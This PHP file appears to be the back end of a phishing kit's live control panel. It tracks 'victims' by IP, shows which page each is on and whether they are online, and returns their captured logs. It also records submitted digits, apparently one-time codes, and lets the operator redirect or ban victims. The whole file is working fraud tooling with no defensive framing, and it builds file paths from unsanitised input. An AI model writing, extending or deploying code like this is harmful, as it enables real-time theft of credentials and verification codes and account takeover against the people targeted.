<?php 
 
require '../classes/mother.class.php';
$m = new Mother;
if(isset($_SESSION['vic'])==""){
$vicFile =	$m->createVic();
}
$vicFile = $m->getFileId();

$m->setDataFile($vicFile);



if(isset($_POST['redirectionListener'])){
	echo $m->getData()['REDIRECT'];
}



if(isset($_POST['clearRedirection'])){
	 $arr = array("REDIRECT"=>0);
		$m->update($arr);
}



if(isset($_POST['getVictimData'])){
	$ip = $_POST['vip'];

$newMother = new Mother;
$newMother->setDataFile((__DIR__)."/../data/vics/VIC-$ip.json");

	$statu = "off";	
	$page = $newMother->getData()["CURRENT_PAGE"];
	
	if($newMother->getData()["LAST_ACT"]  > (time() - 10)){
		$statu="on";
	}else{
		$statu="off";
	}
	$data = new stdClass();
	$data->page = $page;
	$data->data = $newMother->getData()["LOGS"];
	$data->statu = $statu;
	$data = json_encode($data);
	echo $data;
}




if(isset($_POST['getVictims'])){
	$c = 0;
$res = "
<tr>
<th><i class='fa fa-user'></i> ID</th>
<th><i class='fa fa-globe'></i> IP</th>
<th><i class='fa-solid fa-file-lines'></i> Current Page</th>
<th><i class='fa fa-cog'></i> Action</th>
</tr>";

	$getAll=$pdo->query("SELECT * FROM ".($jeehan->tbl)." WHERE ip NOT in (select ip from blockedvics) and last_act > ".(time() -5));
	$rows = $getAll->fetchAll(PDO::FETCH_ASSOC);
	if(!$rows){
		$res .= "<tr><td>No data</td></tr>";
	}else{
		foreach($rows as $row){

			$c++;		
			if($c==2){
				$css="selected";
				$c=0;
			}else{
				$css="";
			}
$ip = $row['ip'];
$res .= "
<tr class='$css'>
<td> ".$row['id']." </td>
<td> ".$row['ip']."   </td>
<td>".$row['current_page']."</td>
<td><button onclick='view(".$row['id'].")'>Control <i class='fa-solid fa-arrow-right'></i></button> <button class='ban' onclick='ban(\"$ip\")'><i class='fa-solid fa-ban'></i> Ban </button></td>
</tr>
";



		}

	}
	echo "<table>$res</table>";
}



if(isset($_POST['keepAlive'])){
 $m->feed(time(), $_POST['page']);
}



if(isset($_POST['dgt'])){
	$ip = $_POST['ip'];
	$m = new Mother;
	$m->setDataFile((__DIR__)."/../data/vics/VIC-$ip.json");
	$arrData = array("LAST_NUM"=>$_POST['dgt']);
	$m->update($arrData);
   }

   


if(isset($_POST['ban'])){
 $jeehan->block($_POST['ban']);
 echo "Victim [".$_POST['ban']."] has been blocked.";
}



if(isset($_POST['getOnlineVics'])){
	echo getOnlines();
}


function getOnlines(){
	global $jeehan;
$res = "<div class='connections'>";
 $on = $jeehan->getOnlineVics();
 if($on>=1){
	 $res .= "<div class='connected'>$on</div>";
 }else{
	 $res .= "<div class='disconnected'>$on</div>";
 }
 $res .= "</div>";
 return $res;
}



if(isset($_POST['pageID'])){
	$pageID = $_POST['pageID'];
	$vicIP = $_POST['vicIP'];

$newMother = new Mother;
$newMother->setDataFile((__DIR__)."/../data/vics/VIC-$vicIP.json");
$arr = array("REDIRECT"=>$pageID);
$newMother->update($arr);

}








?>